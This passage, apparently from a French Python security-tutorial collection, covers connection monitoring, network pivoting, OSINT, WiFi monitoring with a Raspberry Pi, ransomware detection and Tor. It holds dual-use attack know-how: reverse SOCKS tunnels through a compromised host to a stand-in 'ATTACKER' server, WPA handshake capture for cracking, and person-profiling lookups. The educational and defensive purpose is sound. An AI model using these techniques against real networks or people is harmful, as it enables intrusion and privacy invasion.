                "headers": parse_headers(msg['responseHeader']),
                "content": {
                    "text": msg.get('responseBody', '')
                }
            }
        }
        har['log']['entries'].append(entry)

    with open(output_file, 'w') as f:
        json.dump(har, f, indent=2)
```
""",
        "best_practices": """
## Bonnes Pratiques

### Configuration ZAP

```python
# Désactiver les scanners bruyants
zap.ascan.disable_scanners([40012, 40014, 40016])

# Mode "safe" pour ne pas modifier les données
zap.ascan.set_option_attack_mode('Safe')
```

### CI/CD Integration

```yaml
# .gitlab-ci.yml
security_scan:
  image: owasp/zap2docker-stable
  script:
    - zap-baseline.py -t $TARGET_URL -r report.html
  artifacts:
    paths:
      - report.html
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Scanner sans contexte

```python
# Configurer l'authentification
zap.authentication.set_authentication_method(
    contextid=1,
    authmethodname='formBasedAuthentication',
    authmethodconfigparams='loginUrl=...'
)
```
""",
        "tools": """
## Outils

- **ZAP GUI** : Interface graphique complète
- **zap-cli** : CLI pour automation
- **zaproxy** : Package Python
""",
        "references": """
## Références

- [ZAP Documentation](https://www.zaproxy.org/docs/)
- [HAR 1.2 Spec](http://www.softwareishard.com/blog/har-12-spec/)
""",
    },

    "Python.Network.Connections": {
        "title": """Analyse des Connexions Réseau""",
        "intro": """
## Introduction

Surveiller les **connexions réseau** actives permet de détecter les anomalies, backdoors, et exfiltrations de données.

### Indicateurs clés

- Connexions vers des IP inconnues
- Ports inhabituels
- Trafic à des heures anormales
- Volume de données suspect
""",
        "theory": """
## Théorie et Concepts

### États TCP

```
LISTEN      → En attente de connexions
ESTABLISHED → Connexion active
TIME_WAIT   → Fermeture en cours
CLOSE_WAIT  → Attend fermeture locale
SYN_SENT    → Connexion en cours
```

### Informations clés

```
Proto  Local            Remote           State       PID
TCP    192.168.1.10:443 8.8.8.8:80       ESTABLISHED 1234
│      │                │                │           │
└──────┴────────────────┴────────────────┴───────────┘
Quoi connecte quoi, dans quel état, quel processus
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Lister les connexions (Python)

```python
import psutil

def list_connections():
    connections = []

    for conn in psutil.net_connections(kind='inet'):
        try:
            process = psutil.Process(conn.pid)
            proc_name = process.name()
        except:
            proc_name = 'N/A'

        connections.append({
            'proto': 'TCP' if conn.type == 1 else 'UDP',
            'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else '-',
            'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else '-',
            'status': conn.status,
            'pid': conn.pid,
            'process': proc_name
        })

    return connections

# Afficher
for c in list_connections():
    if c['status'] == 'ESTABLISHED':
        print(f"{c['process']:20} {c['local']:25} → {c['remote']:25}")
```

### 2. Détection d'anomalies

```python
import psutil
from ipaddress import ip_address
import socket

SUSPICIOUS_PORTS = {4444, 5555, 6666, 31337}  # Ports backdoor courants
SUSPICIOUS_COUNTRIES = {'CN', 'RU', 'KP'}     # À adapter

def check_suspicious_connections():
    alerts = []

    for conn in psutil.net_connections(kind='inet'):
        if conn.status != 'ESTABLISHED' or not conn.raddr:
            continue

        remote_ip = conn.raddr.ip
        remote_port = conn.raddr.port

        # Port suspect ?
        if remote_port in SUSPICIOUS_PORTS:
            alerts.append({
                'type': 'suspicious_port',
                'ip': remote_ip,
                'port': remote_port,
                'pid': conn.pid
            })

        # IP privée vers internet sur port non-standard ?
        try:
            local = ip_address(conn.laddr.ip)
            remote = ip_address(remote_ip)
            if local.is_private and not remote.is_private:
                if remote_port not in {80, 443, 53, 22}:
                    alerts.append({
                        'type': 'unusual_outbound',
                        'ip': remote_ip,
                        'port': remote_port,
                        'pid': conn.pid
                    })
        except:
            pass

    return alerts

# Vérifier
for alert in check_suspicious_connections():
    print(f"[ALERT] {alert['type']}: {alert['ip']}:{alert['port']}")
```

### 3. Monitoring continu

```python
import psutil
import time
from collections import defaultdict

class ConnectionMonitor:
    def __init__(self):
        self.known_connections = set()
        self.connection_history = defaultdict(list)

    def snapshot(self):
        current = set()

        for conn in psutil.net_connections(kind='inet'):
            if conn.status == 'ESTABLISHED' and conn.raddr:
                key = (conn.laddr, conn.raddr, conn.pid)
                current.add(key)

        # Nouvelles connexions
        new_conns = current - self.known_connections
        for conn in new_conns:
            print(f"[NEW] {conn[0]} → {conn[1]} (PID: {conn[2]})")

        # Connexions fermées
        closed_conns = self.known_connections - current
        for conn in closed_conns:
            print(f"[CLOSED] {conn[0]} → {conn[1]}")

        self.known_connections = current

    def run(self, interval=5):
        print("Monitoring connections...")
        while True:
            self.snapshot()
            time.sleep(interval)

# Lancer
monitor = ConnectionMonitor()
monitor.run()
```

### 4. Export des données

```python
import json
import csv

def export_connections(filename, format='json'):
    conns = list_connections()

    if format == 'json':
        with open(filename, 'w') as f:
            json.dump(conns, f, indent=2)

    elif format == 'csv':
        with open(filename, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=conns[0].keys())
            writer.writeheader()
            writer.writerows(conns)

export_connections('connections.json')
```
""",
        "best_practices": """
## Bonnes Pratiques

### Baseline

```python
# Établir une baseline de connexions normales
# puis alerter sur les déviations

BASELINE = {
    'chrome.exe': {443, 80},
    'outlook.exe': {443, 993, 587},
    'ssh': {22},
}
```

### Logging

```python
import logging

logging.basicConfig(
    filename='/var/log/connections.log',
    format='%(asctime)s - %(message)s'
)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Ignorer les connexions locales

```python
# Les backdoors peuvent utiliser localhost!
if conn.raddr.ip != '127.0.0.1':
    # Ne pas ignorer complètement localhost
```
""",
        "tools": """
## Outils CLI

```bash
# netstat
netstat -tunap

# ss (plus moderne)
ss -tunap

# lsof
lsof -i -P -n
```
""",
        "references": """
## Références

- [psutil Documentation](https://psutil.readthedocs.io/)
""",
    },

    "Python.Network.Pivot": {
        "title": """Pivoting Réseau - Techniques Avancées""",
        "intro": """
## Introduction

Le **pivoting** permet d'utiliser une machine compromise comme relais pour accéder à des réseaux autrement inaccessibles.

### Scénario type

```
Attaquant → [Internet] → Machine A → [Réseau interne] → Machine B
                         (compromis)                    (cible finale)
```
""",
        "theory": """
## Théorie et Concepts

### Types de pivoting

| Technique | Description | Outil |
|-----------|-------------|-------|
| Port forwarding | Redirection de port | SSH, netsh |
| SOCKS proxy | Proxy dynamique | SSH, Chisel |
| VPN | Tunnel complet | Ligolo, OpenVPN |
| Meterpreter | Routes intégrées | Metasploit |

### SSH Port Forwarding

```
Local Forward (-L):
Attacker:8080 → SSH → Pivot → Target:80
"Amène le port distant vers moi"

Remote Forward (-R):
Target:80 → Pivot → SSH → Attacker:8080
"Expose mon port vers là-bas"

Dynamic (-D):
Proxy SOCKS sur le pivot
"Tout le trafic passe par là"
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. SSH Local Port Forward

```bash
# Accéder au port 80 de 10.10.10.5 via pivot
ssh -L 8080:10.10.10.5:80 user@pivot

# Maintenant sur l'attaquant:
curl http://localhost:8080
# → Accède à 10.10.10.5:80
```

### 2. SSH Dynamic SOCKS Proxy

```bash
# Créer un proxy SOCKS
ssh -D 9050 user@pivot

# Utiliser avec proxychains
# /etc/proxychains.conf:
# socks5 127.0.0.1 9050

proxychains nmap -sT -Pn 10.10.10.0/24
```

### 3. Chisel (Sans SSH)

```bash
# Sur l'attaquant (serveur)
./chisel server --reverse --port 8080

# Sur le pivot (client)
./chisel client ATTACKER:8080 R:socks

# SOCKS5 disponible sur attaquant:1080
proxychains curl http://10.10.10.5
```

### 4. Python Proxy Simple

```python
import socket
import threading

def handle_client(client, target_host, target_port):
    # Connexion à la cible
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.connect((target_host, target_port))

    # Relai bidirectionnel
    def forward(src, dst):
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.send(data)

    t1 = threading.Thread(target=forward, args=(client, target))
    t2 = threading.Thread(target=forward, args=(target, client))
    t1.start()
    t2.start()

def port_forward(local_port, target_host, target_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', local_port))
    server.listen(5)

    print(f"Forwarding :{local_port} → {target_host}:{target_port}")

    while True:
        client, addr = server.accept()
        print(f"Connection from {addr}")
        t = threading.Thread(target=handle_client,
                            args=(client, target_host, target_port))
        t.start()

# Usage: Forward local 8080 vers 10.10.10.5:80
port_forward(8080, '10.10.10.5', 80)
```

### 5. Double pivot

```bash
# Pivot 1: accès au réseau 10.10.10.0/24
ssh -D 9050 user@pivot1

# Pivot 2: via pivot1, accès au réseau 192.168.1.0/24
proxychains ssh -D 9051 user@10.10.10.5

# Configurer proxychains en chaîne:
# [ProxyList]
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051
```
""",
        "best_practices": """
## Bonnes Pratiques

### Garder les tunnels stables

```bash
# Autossh pour reconnecter automatiquement
autossh -M 0 -f -N -D 9050 \
    -o "ServerAliveInterval 30" \
    -o "ServerAliveCountMax 3" \
    user@pivot
```

### Documentation

```
Pivot: 192.168.1.50 (compromis)
├── Accès: SSH avec clé
├── Réseaux accessibles:
│   ├── 10.10.10.0/24 (via eth1)
│   └── 172.16.0.0/24 (via eth2)
└── Tunnels actifs:
    └── SOCKS5 :9050 → 10.10.10.0/24
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Oublier le trafic DNS

```bash
# Avec proxychains, le DNS peut fuiter!
# Utiliser proxy_dns dans proxychains.conf
proxy_dns
```
""",
        "tools": """
## Outils

- **SSH** : Port forwarding natif
- **Chisel** : HTTP tunneling
- **Ligolo-ng** : Tunnel moderne
- **sshuttle** : VPN over SSH
- **proxychains** : Chaîner les proxies
""",
        "references": """
## Références

- [SSH Tunneling Explained](https://www.ssh.com/academy/ssh/tunneling)
- [Chisel](https://github.com/jpillora/chisel)
""",
    },

    "Python.Osint.Blackbird": {
        "title": """OSINT - Reconnaissance Open Source""",
        "intro": """
## Introduction

**OSINT (Open Source Intelligence)** désigne la collecte d'informations à partir de sources publiques. **Blackbird** est un outil de recherche d'usernames.

### Sources OSINT

- Réseaux sociaux
- Bases de données publiques
- Moteurs de recherche
- Archives web
- Metadata de fichiers
""",
        "theory": """
## Théorie et Concepts

### Workflow OSINT

```
1. DÉFINIR LA CIBLE
   └──► Nom, email, username, domaine

2. COLLECTER
   ├──► Moteurs de recherche
   ├──► Réseaux sociaux
   ├──► Bases publiques
   └──► Dark web

3. ANALYSER
   ├──► Corrélations
   ├──► Graphes relationnels
   └──► Timeline

4. DOCUMENTER
   └──► Rapport structuré
```

### Recherche par username

```
Username "johndoe123" trouvé sur:
├── Twitter: @johndoe123
├── GitHub: github.com/johndoe123
├── Reddit: u/johndoe123
└── LinkedIn: (corrélation via bio)
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Recherche de username

```python
import requests
from concurrent.futures import ThreadPoolExecutor

PLATFORMS = {
    'github': 'https://github.com/{}',
    'twitter': 'https://twitter.com/{}',
    'instagram': 'https://instagram.com/{}',
    'reddit': 'https://reddit.com/user/{}',
    'linkedin': 'https://linkedin.com/in/{}',
    'youtube': 'https://youtube.com/@{}',
    'tiktok': 'https://tiktok.com/@{}',
}

def check_username(platform, url_template, username):
    url = url_template.format(username)
    try:
        r = requests.get(url, timeout=10, allow_redirects=True)
        if r.status_code == 200:
            return {'platform': platform, 'url': url, 'found': True}
    except:
        pass
    return {'platform': platform, 'url': url, 'found': False}

def search_username(username):
    results = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [
            executor.submit(check_username, platform, url, username)
            for platform, url in PLATFORMS.items()
        ]

        for future in futures:
            result = future.result()
            if result['found']:
                print(f"[+] {result['platform']}: {result['url']}")
                results.append(result)

    return results

# Utilisation
search_username("johndoe")
```

### 2. Recherche d'email

```python
import requests

def search_email(email):
    results = {}

    # Have I Been Pwned (nécessite API key)
    # https://haveibeenpwned.com/API/v3

    # Hunter.io (vérification domaine)
    domain = email.split('@')[1]
    hunter_url = f"https://api.hunter.io/v2/domain-search?domain={domain}"

    # Gravatar
    import hashlib
    email_hash = hashlib.md5(email.lower().encode()).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{email_hash}?d=404"
    try:
        r = requests.get(gravatar_url)
        if r.status_code == 200:
            results['gravatar'] = gravatar_url
    except:
        pass

    return results
```

### 3. Google Dorks

```python
def generate_dorks(target):
    dorks = [
        f'site:linkedin.com "{target}"',
        f'site:facebook.com "{target}"',
        f'site:github.com "{target}"',
        f'"{target}" filetype:pdf',
        f'"{target}" email OR contact',
        f'inurl:"{target}"',
        f'"{target}" password OR leak',
    ]
    return dorks

# Générer les recherches
for dork in generate_dorks("John Doe"):
    print(f"https://google.com/search?q={dork}")
```

### 4. Metadata d'images

```python
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS

def extract_metadata(image_path):
    img = Image.open(image_path)
    exif_data = {}

    if hasattr(img, '_getexif') and img._getexif():
        for tag_id, value in img._getexif().items():
            tag = TAGS.get(tag_id, tag_id)
            exif_data[tag] = value

    # GPS si présent
    if 'GPSInfo' in exif_data:
        gps = {}
        for key, val in exif_data['GPSInfo'].items():
            tag = GPSTAGS.get(key, key)
            gps[tag] = val
        exif_data['GPS'] = gps

    return exif_data

# Extraire les métadonnées
metadata = extract_metadata("photo.jpg")
print(f"Appareil: {metadata.get('Make')} {metadata.get('Model')}")
print(f"Date: {metadata.get('DateTime')}")
```
""",
        "best_practices": """
## Bonnes Pratiques

### Documentation

```python
# Toujours documenter les sources
finding = {
    'data': 'johndoe@example.com',
    'source': 'Twitter bio',
    'url': 'https://twitter.com/johndoe',
    'date': '2024-01-15',
    'confidence': 'high'
}
```

### Éthique

- Respecter la vie privée
- Ne collecter que le nécessaire
- Documenter l'usage légal
- Pas de harcèlement
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Homonymes

```python
# Vérifier les corrélations
# "John Doe" sur Twitter ≠ forcément le même sur LinkedIn
# Chercher des points communs (photo, bio, liens)
```
""",
        "tools": """
## Outils OSINT

- **Maltego** : Graphes relationnels
- **Shodan** : Recherche IoT/serveurs
- **Recon-ng** : Framework OSINT
- **theHarvester** : Emails et sous-domaines
- **SpiderFoot** : Automatisation OSINT
""",
        "references": """
## Références

- [OSINT Framework](https://osintframework.com/)
- [Awesome OSINT](https://github.com/jivoi/awesome-osint)
""",
    },

    "Python.PiZero.WiFi": {
        "title": """Raspberry Pi Zero - Boîte à Outils WiFi""",
        "intro": """
## Introduction

Ce projet transforme un **Raspberry Pi Zero W** en station de monitoring WiFi portable pour l'analyse de réseaux sans fil.

### Fonctionnalités

- Scan des réseaux WiFi environnants
- Capture de handshakes WPA
- Détection d'attaques de deauthentification
- Dashboard web temps réel
- Alertes Telegram
""",
        "theory": """
## Théorie et Concepts

### Mode Monitor

Le mode monitor permet de capturer TOUS les paquets WiFi, pas seulement ceux destinés à notre interface.

```
Mode Managed (normal):
[AP] ←────→ [Client]
     └──── [Pi] (ne voit rien)

Mode Monitor:
[AP] ←────→ [Client]
     └────→ [Pi] (voit tout)
```

### Types de trames 802.11

| Type | Exemples | Intérêt sécurité |
|------|----------|------------------|
| Management | Beacon, Probe, Auth, Deauth | Attaques deauth, evil twin |
| Control | ACK, RTS, CTS | Timing attacks |
| Data | Data, QoS | Capture de trafic |

### Handshake WPA/WPA2

```
Client                                   AP
  │                                      │
  │◄─────── 1. ANonce ──────────────────│
  │                                      │
  │──────── 2. SNonce + MIC ───────────►│
  │         (PTK calculé)                │
  │                                      │
  │◄─────── 3. GTK + MIC ───────────────│
  │                                      │
  │──────── 4. ACK ────────────────────►│
  │                                      │

Pour cracker: Il faut capturer les messages 1-2 ou 2-3
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Activation mode monitor

```bash
# Vérifier support
iw list | grep -i monitor

# Activer avec airmon-ng
airmon-ng start wlan0

# Ou manuellement
ip link set wlan0 down
iw wlan0 set type monitor
ip link set wlan0 up

# Vérifier
iw wlan0 info | grep type
```

### 2. Scanner les réseaux (Python/Scapy)

```python
from scapy.all import *
from collections import defaultdict

networks = defaultdict(dict)

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')

        try:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get('channel')
            crypto = stats.get('crypto')
        except:
            channel = None
            crypto = set()

        networks[bssid] = {
            'ssid': ssid,
            'channel': channel,
            'crypto': crypto,
            'signal': pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
        }

        print(f"[{bssid}] {ssid:20} Ch:{channel} {crypto}")

# Sniff sur interface monitor
sniff(iface='wlan0mon', prn=packet_handler, store=False)
```

### 3. Capture de handshake

```python
from scapy.all import *

handshakes = {}

def capture_eapol(pkt):
    if pkt.haslayer(EAPOL):
        bssid = pkt[Dot11].addr1 if pkt[Dot11].addr1 != pkt[Dot11].addr2 else pkt[Dot11].addr3

        if bssid not in handshakes:
            handshakes[bssid] = []

        handshakes[bssid].append(pkt)

        if len(handshakes[bssid]) >= 2:
            print(f"[+] Handshake capturé pour {bssid}")
            wrpcap(f'handshake_{bssid.replace(":", "")}.pcap', handshakes[bssid])

sniff(iface='wlan0mon', prn=capture_eapol, store=False)
```

### 4. Détection d'attaques deauth

```python
from scapy.all import *
import time

deauth_count = defaultdict(int)

def detect_deauth(pkt):
    if pkt.haslayer(Dot11Deauth):
        src = pkt[Dot11].addr2
        dst = pkt[Dot11].addr1

        deauth_count[src] += 1

        if deauth_count[src] > 10:
            print(f"[ALERT] Deauth attack from {src} ({deauth_count[src]} packets)")
            # Envoyer alerte Telegram
            send_telegram_alert(f"Deauth attack detected from {src}")

sniff(iface='wlan0mon', prn=detect_deauth, store=False)
```

### 5. Dashboard Flask

```python
from flask import Flask, render_template, jsonify

app = Flask(__name__)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/networks')
def api_networks():
    return jsonify(list(networks.values()))

@app.route('/api/alerts')
def api_alerts():
    return jsonify(alerts)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
""",
        "best_practices": """
## Bonnes Pratiques

### Chipsets WiFi recommandés

```
Supportent mode monitor + injection:
- Atheros AR9271 (TP-Link TL-WN722N v1)
- Realtek RTL8812AU (Alfa AWUS036ACH)
- Ralink RT3070 (Alfa AWUS036NH)

NE supportent PAS:
- Chipsets Intel intégrés
- Broadcom (sans patches)
- Realtek récents (RTL8188)
```

### Sécurité du Pi

```python
# Authentification dashboard
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import check_password_hash

auth = HTTPBasicAuth()

@auth.verify_password
def verify(username, password):
    if username == 'admin':
        return check_password_hash(ADMIN_HASH, password)
    return False

@app.route('/api/sensitive')
@auth.login_required
def sensitive():
    return jsonify(data)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Oublier de changer de canal

```bash
# Scanner tous les canaux
for chan in {1..14}; do
    iw wlan0mon set channel $chan
    sleep 2
done
```

### ❌ Interférence avec NetworkManager

```bash
# Arrêter les services qui interfèrent
airmon-ng check kill

# Ou manuellement
systemctl stop NetworkManager
systemctl stop wpa_supplicant
```
""",
        "tools": """
## Outils

### Python
- **Scapy** : Manipulation de paquets
- **pyshark** : Wrapper tshark
- **wifi** : Gestion WiFi

### CLI
```bash
airmon-ng    # Mode monitor
airodump-ng  # Scan réseaux
aireplay-ng  # Injection paquets
aircrack-ng  # Crack handshakes
```
""",
        "references": """
## Références

- [Scapy WiFi](https://scapy.readthedocs.io/en/latest/layers/dot11.html)
- [Aircrack-ng Docs](https://www.aircrack-ng.org/documentation.html)
- [802.11 Frame Types](https://en.wikipedia.org/wiki/802.11_Frame_Types)
""",
    },

    "Python.Ransomware": {
        "title": """Ransomware - Analyse et Compréhension""",
        "intro": """
## Introduction

**AVERTISSEMENT** : Ce contenu est strictement éducatif pour comprendre comment fonctionnent les ransomwares et mieux s'en protéger. L'utilisation malveillante est illégale.

### Objectifs éducatifs

- Comprendre les mécanismes de chiffrement
- Identifier les IOCs (Indicators of Compromise)
- Mettre en place des défenses
- Analyser des samples en sandbox
""",
        "theory": """
## Théorie et Concepts

### Fonctionnement typique

```
1. INFECTION
   │
   ├──► Phishing (email)
   ├──► Exploit (vulnérabilité)
   └──► RDP brute force

2. PERSISTENCE
   │
   ├──► Clés registre
   ├──► Tâches planifiées
   └──► WMI subscriptions

3. CHIFFREMENT
   │
   ├──► Génération clé AES (symétrique)
   ├──► Chiffrement fichiers
   └──► Chiffrement clé AES avec RSA public

4. EXTORSION
   │
   └──► Demande de rançon (Bitcoin)
```

### Types de chiffrement

| Type | Avantage | Utilisé par |
|------|----------|-------------|
| AES-256 | Rapide | La plupart |
| RSA | Asymétrique | Protection clé |
| ChaCha20 | Très rapide | Moderne |
| Hybrid | Combinaison | Standard actuel |
""",
        "tutorial": """
## Analyse Éducative

### 1. Simulation de chiffrement (LAB ONLY)

```python
# ATTENTION : Code éducatif uniquement
# NE JAMAIS exécuter hors environnement isolé

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

def educational_encrypt(data, key):
    '''Montre comment fonctionne AES - NE PAS UTILISER'''
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Padding
    padding_length = 16 - (len(data) % 16)
    padded_data = data + bytes([padding_length] * padding_length)

    encrypted = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted

# Ceci montre le principe - JAMAIS en production
```

### 2. Détection d'activité ransomware

```python
import os
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class RansomwareDetector(FileSystemEventHandler):
    def __init__(self):
        self.modify_count = 0
        self.rename_count = 0
        self.start_time = time.time()
        self.suspicious_extensions = {
            '.encrypted', '.locked', '.crypto',
            '.crypt', '.enc', '.pays'
        }

    def on_modified(self, event):
        if not event.is_directory:
            self.modify_count += 1
            self.check_threshold()

    def on_moved(self, event):
        if not event.is_directory:
            # Extension suspecte ?
            _, ext = os.path.splitext(event.dest_path)
            if ext.lower() in self.suspicious_extensions:
                print(f"[ALERT] Suspicious rename: {event.dest_path}")

            self.rename_count += 1
            self.check_threshold()

    def check_threshold(self):
        elapsed = time.time() - self.start_time

        # Plus de 100 fichiers modifiés en 1 minute ?
        if elapsed < 60 and self.modify_count > 100:
            print("[CRITICAL] Possible ransomware activity!")
            print(f"  {self.modify_count} files modified in {elapsed:.0f}s")
            # Ici : déclencher alerte, isoler machine, etc.

# Utilisation
observer = Observer()
observer.schedule(RansomwareDetector(), "/path/to/monitor", recursive=True)
observer.start()
```

### 3. Honeypot fichiers

```python
import os
import time
import hashlib

def create_honeypot_files(directory, count=10):
    '''Crée des fichiers leurres pour détecter les ransomwares'''
    honeypots = []

    names = [
        'budget_2024.xlsx',
        'passwords.docx',
        'bank_accounts.pdf',
        'confidential.txt'
    ]

    for i, name in enumerate(names[:count]):
        path = os.path.join(directory, name)
        content = f"Honeypot file {i} - {time.time()}"

        with open(path, 'w') as f:
            f.write(content)

        honeypots.append({
            'path': path,
            'hash': hashlib.sha256(content.encode()).hexdigest(),
            'mtime': os.path.getmtime(path)
        })

    return honeypots

def check_honeypots(honeypots):
    '''Vérifie si les fichiers leurres ont été modifiés'''
    for hp in honeypots:
        if not os.path.exists(hp['path']):
            print(f"[ALERT] Honeypot deleted: {hp['path']}")
            return True

        current_mtime = os.path.getmtime(hp['path'])
        if current_mtime != hp['mtime']:
            print(f"[ALERT] Honeypot modified: {hp['path']}")
            return True

        with open(hp['path'], 'r') as f:
            content = f.read()
            current_hash = hashlib.sha256(content.encode()).hexdigest()
            if current_hash != hp['hash']:
                print(f"[ALERT] Honeypot content changed: {hp['path']}")
                return True

    return False
```

### 4. Analyse de samples

```python
import yara
import pefile
import hashlib

def analyze_sample(filepath):
    '''Analyse basique d'un exécutable suspect'''
    results = {
        'hashes': {},
        'pe_info': {},
        'suspicious': []
    }

    # Hashes
    with open(filepath, 'rb') as f:
        data = f.read()
        results['hashes'] = {
            'md5': hashlib.md5(data).hexdigest(),
            'sha256': hashlib.sha256(data).hexdigest()
        }

    # PE analysis
    try:
        pe = pefile.PE(filepath)
        results['pe_info'] = {
            'sections': [s.Name.decode().strip('\x00') for s in pe.sections],
            'imports': [e.dll.decode() for e in pe.DIRECTORY_ENTRY_IMPORT]
        }

        # Imports suspects
        crypto_dlls = ['advapi32.dll', 'crypt32.dll']
        for dll in results['pe_info']['imports']:
            if dll.lower() in crypto_dlls:
                results['suspicious'].append(f"Crypto DLL: {dll}")

    except Exception as e:
        results['pe_info'] = {'error': str(e)}

    return results
```
""",
        "best_practices": """
## Protection et Défense

### Sauvegardes

```bash
# Règle 3-2-1
# 3 copies des données
# 2 supports différents
# 1 copie hors-site/offline
```

### Segmentation

```
[Internet] ──► [DMZ] ──► [Firewall] ──► [LAN]
                              │
                              ▼
                    [Backup Network]
                    (isolé, offline)
```

### Monitoring

```python
# Surveillez ces indicateurs
indicators = [
    'Fichiers renommés en masse',
    'Extensions inhabituelles',
    'Accès réseau anormal',
    'Processus inconnus avec crypto',
    'Shadow copies supprimées'
]
```
""",
        "pitfalls": """
## À Éviter

### ❌ Payer la rançon

- Ne garantit pas le déchiffrement
- Finance les criminels
- Vous marque comme cible
""",
        "tools": """
## Outils d'analyse

- **Yara** : Règles de détection
- **PEStudio** : Analyse PE
- **Any.Run** : Sandbox en ligne
- **VirusTotal** : Multi-AV scan
""",
        "references": """
## Références

- [No More Ransom](https://www.nomoreransom.org/)
- [ID Ransomware](https://id-ransomware.malwarehunterteam.com/)
- [CISA Ransomware Guide](https://www.cisa.gov/stopransomware)
""",
    },

    "Python.Tor.Proxy": {
        "title": """TOR - Proxy et Anonymat Réseau""",
        "intro": """
## Introduction

**TOR (The Onion Router)** est un réseau d'anonymisation qui achemine le trafic à travers plusieurs relais chiffrés.

### Cas d'usage légitimes

- Protection de la vie privée
- Contournement de la censure
- Recherche en sécurité
- Whistleblowing
""",
        "theory": """
## Théorie et Concepts

### Fonctionnement

```
┌────────┐    ┌────────┐    ┌────────┐    ┌────────┐    ┌────────┐
│ Client │───►│ Guard  │───►│ Middle │───►│  Exit  │───►│ Target │
└────────┘    └────────┘    └────────┘    └────────┘    └────────┘
     │             │             │             │
   Chiffré      Chiffré      Chiffré       Clair
   3 couches    2 couches    1 couche
```

### Couches de chiffrement

```
Client:
  Paquet = Encrypt(Exit_key,
              Encrypt(Middle_key,
                Encrypt(Guard_key, Data)))

Chaque nœud enlève une couche (comme un oignon)
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration Python avec TOR

```python
import requests

# TOR doit être lancé (service tor ou Tor Browser)
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def get_via_tor(url):
    try:
        r = requests.get(url, proxies=proxies, timeout=30)
        return r.text
    except Exception as e:
        print(f"Erreur: {e}")
        return None

# Vérifier l'IP TOR
def check_tor():
    ip = get_via_tor('https://api.ipify.org')
    print(f"IP via TOR: {ip}")

    # Vérifier si c'est bien une IP TOR
    tor_check = get_via_tor('https://check.torproject.org/api/ip')
    print(tor_check)

check_tor()
```

### 2. Changer d'identité (nouveau circuit)

```python
from stem import Signal
from stem.control import Controller

def renew_tor_identity():
    '''Demande un nouveau circuit TOR'''
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_password')
        controller.signal(Signal.NEWNYM)
        print("Nouveau circuit TOR demandé")

# Configurer le mot de passe dans torrc:
# HashedControlPassword (généré avec: tor --hash-password "your_password")
# ControlPort 9051
```

### 3. Scraping anonyme

```python
import requests
from stem import Signal
from stem.control import Controller
import time

class TorSession:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    def renew_identity(self):
        with Controller.from_port(port=9051) as c:
            c.authenticate(password='password')
            c.signal(Signal.NEWNYM)
        time.sleep(5)  # Attendre le nouveau circuit

    def get(self, url, new_identity=False):
        if new_identity:
            self.renew_identity()
        return self.session.get(url, timeout=30)

# Utilisation
tor = TorSession()

urls = ['https://example.com/page1', 'https://example.com/page2']
for url in urls:
    response = tor.get(url, new_identity=True)
    print(f"Fetched {url}")
    time.sleep(2)
```

### 4. Accès aux services .onion

```python
def access_onion(onion_url):
    '''Accède à un service .onion'''
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    try:
        r = requests.get(onion_url, proxies=proxies, timeout=60)
        return r.text
    except Exception as e:
        print(f"Erreur: {e}")
        return None

# Exemple avec DuckDuckGo onion
# content = access_onion('https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/')
```

### 5. Créer un service .onion (Hidden Service)

```python
# Configuration dans torrc:
'''
HiddenServiceDir /var/lib/tor/my_service/
HiddenServicePort 80 127.0.0.1:8080
'''

# Ensuite lancer un serveur web local
from flask import Flask
app = Flask(__name__)

@app.route('/')
def index():
    return "Service caché fonctionnel!"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)

# L'adresse .onion sera dans:
# /var/lib/tor/my_service/hostname
```
""",
        "best_practices": """
## Bonnes Pratiques

### Éviter les fuites

```python
# TOUJOURS utiliser socks5h (pas socks5)
# Le 'h' signifie que la résolution DNS passe aussi par TOR

# MAUVAIS - DNS leak
proxies = {'http': 'socks5://127.0.0.1:9050'}

# BON - DNS via TOR
proxies = {'http': 'socks5h://127.0.0.1:9050'}
```

### Headers

```python
# Minimiser les informations identifiantes
headers = {
